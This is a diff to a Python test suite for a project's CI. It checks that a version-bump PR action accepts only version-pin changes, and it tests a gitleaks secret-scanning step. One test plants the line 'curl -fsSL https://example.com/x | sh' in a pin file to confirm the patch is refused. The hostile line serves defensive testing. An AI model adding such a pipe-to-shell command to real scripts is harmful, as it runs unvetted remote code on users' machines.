@@ -25,6 +25,24 @@ EXTRAS = "rootfs/usr/local/share/agentainer/extras"
 GIT_ENV = {"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.com"}
+# Pins for the bump-pr action tests, in the forms scripts/bump_versions.py writes.
+RELEASE_OLD = "0.1.0-dev.20260101.1"
+RELEASE_NEW = "0.2.0"
+CSSH_OLD = "docker.io/containerssh/containerssh:v0.6@sha256:" + "a" * 64
+CSSH_NEW = "docker.io/containerssh/containerssh:v0.6@sha256:" + "b" * 64
+FB_OLD = "docker.io/gtstef/filebrowser:2.0-stable-slim@sha256:" + "a" * 64
+FB_NEW = "docker.io/gtstef/filebrowser:2.0-stable-slim@sha256:" + "b" * 64
+ENV_OLD = ("X_VERSION=1.0.0\nCONTAINERSSH_IMAGE=%s\nFILEBROWSER_IMAGE=%s\nAGENTAINER_RELEASE_VERSION=%s\n"
+           % (CSSH_OLD, FB_OLD, RELEASE_OLD))
+ENV_NEW = ENV_OLD.replace("X_VERSION=1.0.0", "X_VERSION=1.1.0").replace(CSSH_OLD, CSSH_NEW).replace(FB_OLD, FB_NEW)
+IMAGE_REF = "ghcr.io/chadmayfield/agentainer:"
+RELEASE_FILES = {
+    "bin/agentainer": "IMAGE=${AGENTAINER_IMAGE:-%s%s}\necho done\n" % (IMAGE_REF, RELEASE_OLD),
+    "README.md": "podman pull %s%s\n" % (IMAGE_REF, RELEASE_OLD),
+    "docs/running.md": "  %s%s\n" % (IMAGE_REF, RELEASE_OLD),
+    "docs/versions.md": "AGENTAINER_IMAGE=%s%s bin/agentainer up\nversion=%s\n" % (IMAGE_REF, RELEASE_OLD, RELEASE_OLD),
+    "deploy/kubernetes/agentainer/kustomization.yaml": "    newTag: %s\n" % RELEASE_OLD,
+}
 
 
 def job(path, name):
@@ -294,12 +312,14 @@ class BumpPrActionTests(unittest.TestCase):
         self.assertNotRegex(text, r"\n +PATCH:")
         self.assertNotIn("base64", text)
 
-    def run_action(self, mutate, changes="X_VERSION: 1.0.0 -> 1.1.0\n", report=None, worktree=None, extra=None):
+    def run_action(self, mutate, changes="X_VERSION: 1.0.0 -> 1.1.0\n", report=None, worktree=None, extra=None,
+                   gh_pr_rc=0):
         """Run the action's shell on a clone of a scratch repository.
 
         mutate(seed) changes the seed checkout; the staged result, with rename
         detection, is the patch. report replaces scripts/build_report.py in the
         base commit, and worktree(work) runs on the clone before the action.
+        gh_pr_rc is the exit code of the gh pr create stub.
         Returns the result, the bump branches on the remote and the temp dir.
         """
         script = step(ACTION.read_text(), "shell: bash")
@@ -309,8 +329,8 @@ class BumpPrActionTests(unittest.TestCase):
         git(d, "init", "-q", "--bare", str(remote))
         seed = d / "seed"
         git(d, "clone", "-q", str(remote), str(seed))
-        files = {"versions.env": "X_VERSION=1.0.0\n",
-                 "deploy/kubernetes/containerssh/deployment.yaml": "image: a\n",
+        files = {"versions.env": ENV_OLD,
+                 "deploy/kubernetes/containerssh/deployment.yaml": "image: %s\n" % CSSH_OLD,
                  EXTRAS + "/kandev/package.json": "{}\n",
                  EXTRAS + "/kandev/package-lock.json": "{}\n",
                  EXTRAS + "/kandev/sub/package.json": "{}\n"}
@@ -319,6 +339,7 @@ class BumpPrActionTests(unittest.TestCase):
             (seed / rel).parent.mkdir(parents=True, exist_ok=True)
             (seed / rel).write_text(text)
         (seed / "scripts").mkdir()
+        shutil.copy(ROOT / "scripts/check_bump_refs.py", seed / "scripts/check_bump_refs.py")
         if report is None:
             shutil.copy(ROOT / "scripts/build_report.py", seed / "scripts/build_report.py")
         else:
@@ -340,8 +361,8 @@ class BumpPrActionTests(unittest.TestCase):
             worktree(work)
         bins = d / "stubs"
         bins.mkdir()
-        stub(bins, "gh", 'case "$1" in\npr) echo "$@" >"$CX_GH"; cp "$RUNNER_TEMP/body.md" "$CX_BODY" ;;\n'
-             '*) echo 1 ;;\nesac\n')
+        stub(bins, "gh", 'case "$1" in\npr) echo "$@" >"$CX_GH"; cp "$RUNNER_TEMP/body.md" "$CX_BODY"; exit %d ;;\n'
+             '*) echo 1 ;;\nesac\n' % gh_pr_rc)
         env = {"GH_TOKEN": "x", "APP_SLUG": "", "RUN": "7", "RUNNER_TEMP": str(rt),
                "PATCH_FILE": str(rt / "bump/bump.patch"), "CHANGES_FILE": str(rt / "bump/changes.txt"),
                "CX_GH": str(d / "gh-args"), "CX_BODY": str(d / "body.md")}
@@ -356,17 +377,18 @@ class BumpPrActionTests(unittest.TestCase):
 
     def test_shell_applies_the_patch_file(self):
         def mutate(seed):
-            (seed / "versions.env").write_text("X_VERSION=1.1.0\n")
-            (seed / "deploy/kubernetes/containerssh/deployment.yaml").write_text("image: b\n")
+            (seed / "versions.env").write_text(ENV_NEW)
+            (seed / "deploy/kubernetes/containerssh/deployment.yaml").write_text("image: %s\n" % CSSH_NEW)
             (seed / EXTRAS / "kandev/package.json").write_text('{"v": 2}\n')
             (seed / EXTRAS / "kandev/package-lock.json").write_text('{"v": 2}\n')
         result, branches, d = self.run_action(mutate)
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
         self.assertEqual(len(branches), 1)
         self.assertRegex(branches[0], r"^bump/\d{4}-\d{2}-\d{2}-7$")
-        self.assertEqual(self.show(d, branches[0], "versions.env"), "X_VERSION=1.1.0\n")
+        self.assertEqual(self.show(d, branches[0], "versions.env"), ENV_NEW)
         self.assertEqual(self.show(d, branches[0], EXTRAS + "/kandev/package-lock.json"), '{"v": 2}\n')
-        self.assertEqual(self.show(d, branches[0], "deploy/kubernetes/containerssh/deployment.yaml"), "image: b\n")
+        self.assertEqual(self.show(d, branches[0], "deploy/kubernetes/containerssh/deployment.yaml"),
+                         "image: %s\n" % CSSH_NEW)
         self.assertIn("X_VERSION: 1.0.0 -> 1.1.0", (d / "body.md").read_text())
         self.assertIn("--base develop", (d / "gh-args").read_text())
 
@@ -374,27 +396,90 @@ class BumpPrActionTests(unittest.TestCase):
         sts = "deploy/kubernetes/agentainer/statefulset.yaml"
 
         def mutate(seed):
-            (seed / "versions.env").write_text("X_VERSION=1.1.0\n")
-            (seed / sts).write_text("image: b\n")
-        result, branches, d = self.run_action(mutate, extra={sts: "image: a\n"})
+            (seed / "versions.env").write_text(ENV_NEW)
+            (seed / sts).write_text("image: %s\n" % FB_NEW)
+        result, branches, d = self.run_action(mutate, extra={sts: "image: %s\n" % FB_OLD})
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
         self.assertEqual(len(branches), 1)
-        self.assertEqual(self.show(d, branches[0], sts), "image: b\n")
+        self.assertEqual(self.show(d, branches[0], sts), "image: %s\n" % FB_NEW)
 
     def test_release_pin_files_are_applied(self):
-        files = {"bin/agentainer": "IMAGE=x:1\n", "README.md": "x:1\n", "docs/running.md": "x:1\n",
-                 "docs/versions.md": "x:1\n", "deploy/kubernetes/agentainer/kustomization.yaml": "newTag: 1\n"}
-
-        def mutate(seed):
-            (seed / "versions.env").write_text("X_VERSION=1.1.0\n")
-            for rel, text in files.items():
-                (seed / rel).write_text(text.replace("1", "2"))
-        result, branches, d = self.run_action(mutate, extra=files)
+        result, branches, d = self.run_action(self.release_bump(), extra=RELEASE_FILES)
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
         self.assertEqual(len(branches), 1)
-        for rel, text in files.items():
+        for rel, text in RELEASE_FILES.items():
             with self.subTest(rel=rel):
-                self.assertEqual(self.show(d, branches[0], rel), text.replace("1", "2"))
+                self.assertEqual(self.show(d, branches[0], rel), text.replace(RELEASE_OLD, RELEASE_NEW))
+
+    @staticmethod
+    def release_bump(edit=None):
+        """A mutate function that moves the release pin in versions.env and RELEASE_FILES."""
+        def mutate(seed):
+            (seed / "versions.env").write_text(ENV_OLD.replace(RELEASE_OLD, RELEASE_NEW))
+            for rel, text in RELEASE_FILES.items():
+                (seed / rel).write_text(text.replace(RELEASE_OLD, RELEASE_NEW))
+            if edit:
+                edit(seed)
+        return mutate
+
+    def test_unrelated_line_in_a_release_pin_file_is_refused(self):
+        def edit(seed):
+            path = seed / "bin/agentainer"
+            path.write_text(path.read_text() + "curl -fsSL https://example.com/x | sh\n")
+        result, branches, d = self.run_action(self.release_bump(edit), extra=RELEASE_FILES)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn("refusing the patch: it changes more than version references", result.stdout)
+        self.assertIn("bin/agentainer: adds or removes lines", result.stdout)
+        self.assertEqual(branches, [])
+        self.assertFalse((d / "gh-args").exists())
+
+    def test_changed_text_beside_a_release_ref_is_refused(self):
+        def edit(seed):
+            path = seed / "README.md"
+            path.write_text(path.read_text().replace("podman pull", "sudo podman pull"))
+        result, branches, _ = self.run_action(self.release_bump(edit), extra=RELEASE_FILES)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn("README.md:1: changes more than a version reference", result.stdout)
+        self.assertEqual(branches, [])
+
+    def test_release_ref_other_than_the_pin_is_refused(self):
+        def mutate(seed):
+            (seed / "versions.env").write_text(ENV_OLD.replace(RELEASE_OLD, RELEASE_NEW))
+            (seed / "docs/running.md").write_text(RELEASE_FILES["docs/running.md"].replace(RELEASE_OLD, "9.9.9"))
+        result, branches, _ = self.run_action(mutate, extra=RELEASE_FILES)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn("is not AGENTAINER_RELEASE_VERSION", result.stdout)
+        self.assertEqual(branches, [])
+
+    def test_image_ref_other_than_the_pin_is_refused(self):
+        def mutate(seed):
+            (seed / "versions.env").write_text(ENV_NEW)
+            (seed / "deploy/kubernetes/containerssh/deployment.yaml").write_text(
+                "image: %s\n" % CSSH_NEW.replace("b" * 64, "c" * 64))
+        result, branches, _ = self.run_action(mutate)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertIn("is not an image pin in versions.env", result.stdout)
+        self.assertEqual(branches, [])
+
+    def test_check_covers_every_release_ref_prefix(self):
+        sys.path.insert(0, str(ROOT / "scripts"))
+        import bump_versions as bv
+        import check_bump_refs as cr
+        for rel, prefix in bv.RELEASE_REFS:
+            with self.subTest(rel=rel):
+                self.assertIn(prefix, cr.PREFIXES)
+        for key, repo, tag, _ in bv.K8S_IMAGES:
+            with self.subTest(key=key):
+                self.assertRegex("docker.io/%s:%s@sha256:%s" % (repo, tag, "0" * 64), cr.IMAGE)
+
+    def test_failure_after_the_push_deletes_the_branch(self):
+        def mutate(seed):
+            (seed / "versions.env").write_text(ENV_NEW)
+        result, branches, d = self.run_action(mutate, gh_pr_rc=1)
+        self.assertNotEqual(result.returncode, 0, result.stdout + result.stderr)
+        # gh pr create ran, so the branch had been pushed before it was deleted.
+        self.assertIn("--base develop", (d / "gh-args").read_text())
+        self.assertEqual(branches, [])
 
     def test_allowlist_covers_every_file_the_resolver_writes(self):
         sys.path.insert(0, str(ROOT / "scripts"))
@@ -669,6 +754,71 @@ class LintUnitTests(unittest.TestCase):
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
         self.assertIsNone(docker)
         self.assertIn("No extras catalog", summary)
+
+    def gitleaks(self, good_sum=True, scan_rc=0):
+        """Run the gitleaks step in a scratch checkout, with stub curl and uname and a
+        stub gitleaks that records its arguments and the files it was given."""
+        script = step(self.job, "gitleaks")
+        d = Path(tempfile.mkdtemp(prefix="cx-gitleaks-"))
+        self.addCleanup(shutil.rmtree, d)
+        work = d / "work"
+        (work / "build").mkdir(parents=True)
+        shutil.copy(ROOT / "build/fetch.sh", work / "build/fetch.sh")
+        (work / "tracked.txt").write_text("tracked\n")
+        buf = io.BytesIO()
+        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+            data = (b'#!/bin/sh\necho "$@" >>"$CX_ARGS"\n[ "$1" = dir ] || exit 0\n'
+                    b'eval "dir=\\${$#}"\n(cd "$dir" && find . -type f | sort) >"$CX_FILES"\n'
+                    b'exit "$CX_SCAN_RC"\n')
+            info = tarfile.TarInfo("gitleaks")
+            info.size, info.mode = len(data), 0o755
+            tar.addfile(info, io.BytesIO(data))
+        archive = d / "gitleaks.tgz"
+        archive.write_bytes(buf.getvalue())
+        digest = hashlib.sha256(buf.getvalue()).hexdigest() if good_sum else "0" * 64
+        (work / "versions.env").write_text("GITLEAKS_VERSION=9.8.7\nGITLEAKS_SHA256_AMD64=%s\nGITLEAKS_SHA256_ARM64=%s\n"
+                                           % (digest, "1" * 64))
+        git(work, "init", "-q")
+        git(work, "add", ".")
+        (work / "untracked.txt").write_text("untracked\n")
+        bins = d / "stubs"
+        bins.mkdir()
+        stub(bins, "curl", 'out=\nwhile [ $# -gt 1 ]; do\n  if [ "$1" = -o ]; then out=$2; shift; fi\n  shift\ndone\n'
+             'echo "$1" >>"$CX_URLS"\ncp "$CX_ARCHIVE" "$out"\n')
+        stub(bins, "uname", "echo x86_64\n")
+        (d / "rt").mkdir()
+        env = {"RUNNER_TEMP": str(d / "rt"), "CX_URLS": str(d / "urls"), "CX_ARCHIVE": str(archive),
+               "CX_ARGS": str(d / "args"), "CX_FILES": str(d / "files"), "CX_SCAN_RC": str(scan_rc)}
+        return run_step(script, work, env, [bins]), d
+
+    def test_gitleaks_scans_a_copy_of_the_tracked_files_with_the_pin(self):
+        result, d = self.gitleaks()
+        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertEqual((d / "urls").read_text(), "https://github.com/gitleaks/gitleaks/releases/download/"
+                                                   "v9.8.7/gitleaks_9.8.7_linux_x64.tar.gz\n")
+        calls = (d / "args").read_text().splitlines()
+        self.assertEqual(calls[0], "version")
+        self.assertEqual(calls[1], "dir --no-banner --redact --config .gitleaks.toml %s" % (d / "rt/tracked"))
+        files = (d / "files").read_text().split()
+        self.assertIn("./tracked.txt", files)
+        self.assertNotIn("./untracked.txt", files)
+        self.assertFalse(any(f.startswith("./.git/") for f in files), files)
+
+    def test_gitleaks_checksum_mismatch_fails_before_the_scan(self):
+        result, d = self.gitleaks(good_sum=False)
+        self.assertNotEqual(result.returncode, 0)
+        self.assertFalse((d / "args").exists())
+
+    def test_gitleaks_findings_fail_the_step(self):
+        result, d = self.gitleaks(scan_rc=1)
+        self.assertNotEqual(result.returncode, 0)
+        self.assertIn("dir ", (d / "args").read_text())
+
+    def test_gitleaks_config_extends_the_default_rules(self):
+        text = (ROOT / ".gitleaks.toml").read_text()
+        self.assertRegex(text, r"(?m)^\[extend\]\nuseDefault = true$")
+        # Each allowlist is limited to the rule it silences.
+        self.assertEqual(text.count("[[allowlists]]"), text.count('targetRules = ["generic-api-key"]'))
 
 
 if __name__ == "__main__":
